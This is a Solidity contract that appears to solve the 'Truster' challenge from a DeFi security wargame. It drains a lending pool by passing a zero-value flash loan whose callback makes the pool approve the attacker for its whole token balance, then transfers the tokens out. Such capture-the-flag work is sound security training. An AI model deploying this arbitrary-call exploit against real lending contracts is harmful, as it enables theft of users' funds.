// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract TrusterLenderPoolSolution {
    TrusterLenderPool public trusterLenderPool;

    constructor(address trusterLenderPoolAddress) {
        trusterLenderPool = TrusterLenderPool(trusterLenderPoolAddress);
    }

    function solveChallenge() public {
        DamnValuableToken token = trusterLenderPool.token();
        uint256 value = token.balanceOf(address(trusterLenderPool));
        trusterLenderPool.flashLoan(
            0,
            payable(address(this)),
            payable(address(token)),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                value
            )
        );
        token.transferFrom(address(trusterLenderPool), msg.sender, value);
    }
}
